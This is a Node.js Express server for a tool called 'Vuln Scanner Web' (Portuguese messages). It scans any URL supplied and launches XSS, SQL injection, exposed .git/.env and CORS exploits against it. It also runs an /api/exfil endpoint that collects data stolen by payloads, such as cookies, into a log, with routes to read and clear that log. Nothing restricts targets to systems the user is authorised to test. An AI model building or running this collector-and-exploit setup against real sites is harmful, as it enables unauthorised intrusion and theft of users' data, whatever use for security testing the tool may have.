import express from 'express';
import path from 'path';
import fs from 'node:fs';
import { fileURLToPath } from 'url';
import { runPassiveScan } from './scanners/passiveScanner.js';
import { runActiveScan } from './scanners/activeScanner.js';
import { exploitXss, exploitSqli, exploitGitExposure, exploitEnvExposure, exploitCors } from './scanners/exploiter.js';

var __filename = fileURLToPath(import.meta.url);
var __dirname = path.dirname(__filename);

var app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/scan', async (req, res) => {
  var body = req.body || {};
  var url = body.url;
  var passive = body.passive;
  var active = body.active;
  if (!url || typeof url !== 'string' || !url.trim()) {
    return res.status(400).json({ error: 'Informe uma URL valida.' });
  }
  if (!passive && !active) {
    return res.status(400).json({ error: 'Selecione ao menos um tipo de analise.' });
  }
  var target = url.trim();
  if (!/^https?:\/\//i.test(target)) target = 'https://' + target;
  try { new URL(target); } catch (e) { return res.status(400).json({ error: 'URL mal formada.' }); }

  var results = [];
  try {
    if (passive) results.push.apply(results, await runPassiveScan(new URL(target)));
    if (active) results.push.apply(results, await runActiveScan(target));
  } catch (err) {
    return res.status(500).json({ error: 'Falha no escaneamento: ' + err.message });
  }
  res.json({ target: target, results: results });
});

app.post('/api/exploit', async (req, res) => {
  var body = req.body || {};
  var type = body.type;
  var target = body.target;
  var param = body.param;
  if (!type || !target) return res.status(400).json({ error: 'Tipo e target sao obrigatorios.' });

  try {
    var results;
    if (type === 'xss') results = await exploitXss(target, param || 'id');
    else if (type === 'sqli') results = await exploitSqli(target, param || 'id');
    else if (type === 'git') results = await exploitGitExposure(target);
    else if (type === 'env') results = await exploitEnvExposure(target);
    else if (type === 'cors') results = await exploitCors(target);
    else return res.status(400).json({ error: 'Tipo desconhecido: ' + type });
    res.json({ target: target, type: type, results: results });
  } catch (err) {
    res.status(500).json({ error: 'Falha no exploit: ' + err.message });
  }
});

app.get('/api/exfil', (req, res) => {
  var data = req.query.c || req.query.data || '(vazio)';
  var timestamp = new Date().toISOString();
  var logLine = '[' + timestamp + '] ' + data + '\n';
  console.log('[EXFIL] ' + logLine.trim());
  try { fs.appendFileSync('exfil.log', logLine); } catch (e) {}
  res.type('text/plain').send('logged');
});

app.get('/api/exfil-logs', (req, res) => {
  try {
    var logs = fs.existsSync('exfil.log') ? fs.readFileSync('exfil.log', 'utf-8') : '(nenhum dado capturado ainda)';
    res.json({ logs: logs });
  } catch (e) { res.json({ logs: 'Erro ao ler logs.' }); }
});

app.get('/api/clear-logs', (req, res) => {
  try { fs.writeFileSync('exfil.log', ''); res.json({ ok: true }); } catch (e) { res.json({ ok: false }); }
});

var PORT = process.env.PORT || 3000;
app.listen(PORT, function() {
  console.log('Vuln Scanner Web rodando em http://localhost:' + PORT);
});